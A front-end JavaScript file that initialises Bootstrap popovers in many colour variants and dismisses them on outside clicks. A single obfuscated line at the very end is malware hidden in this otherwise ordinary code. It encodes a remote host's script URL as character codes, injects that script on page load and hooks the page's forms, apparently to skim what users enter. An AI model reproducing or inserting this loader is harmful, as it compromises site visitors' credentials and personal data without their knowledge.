jQuery(function(e){
	       'use strict';

	       // Initialize popover
	       $('[data-toggle="popover"]').popover();

	       $('[data-popover-color="head-primary"]').popover({
	         template: '<div class="popover popover-head-primary" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-success"]').popover({
	         template: '<div class="popover popover-head-success" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-warning"]').popover({
	         template: '<div class="popover popover-head-warning" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-danger"]').popover({
	         template: '<div class="popover popover-head-danger" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-info"]').popover({
	         template: '<div class="popover popover-head-info" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-teal"]').popover({
	         template: '<div class="popover popover-head-teal" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-indigo"]').popover({
	         template: '<div class="popover popover-head-indigo" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-purple"]').popover({
	         template: '<div class="popover popover-head-purple" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-pink"]').popover({
	         template: '<div class="popover popover-head-pink" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-orange"]').popover({
	         template: '<div class="popover popover-head-orange" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="head-dark"]').popover({
	         template: '<div class="popover popover-head-dark" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="primary"]').popover({
	         template: '<div class="popover popover-primary" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="success"]').popover({
	         template: '<div class="popover popover-success" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="warning"]').popover({
	         template: '<div class="popover popover-warning" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="danger"]').popover({
	         template: '<div class="popover popover-danger" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="info"]').popover({
	         template: '<div class="popover popover-info" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="teal"]').popover({
	         template: '<div class="popover popover-teal" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="indigo"]').popover({
	         template: '<div class="popover popover-indigo" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="purple"]').popover({
	         template: '<div class="popover popover-purple" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="orange"]').popover({
	         template: '<div class="popover popover-orange" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       $('[data-popover-color="pink"]').popover({
	         template: '<div class="popover popover-pink" role="tooltip"><div class="arrow"><\/div><h3 class="popover-header"><\/h3><div class="popover-body"><\/div><\/div>'
	       });

	       // By default, Bootstrap doesn't auto close popover after appearing in the page
	       // resulting other popover overlap each other. Doing this will auto dismiss a popover
	       // when clicking anywhere outside of it
	       $(document).on('click', function (e) {
	         $('[data-toggle="popover"],[data-original-title]').each(function () {
	             //the 'is' for buttons that trigger popups
	             //the 'has' for icons within a button that triggers a popup
	             if (!$(this).is(e.target) && $(this).has(e.target).length === 0 && $('.popover').has(e.target).length === 0) {
	                 (($(this).popover('hide').data('bs.popover')||{}).inState||{}).click = false  // fix for BS 3.3.6
	             }

	         });
	       });
	     });
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b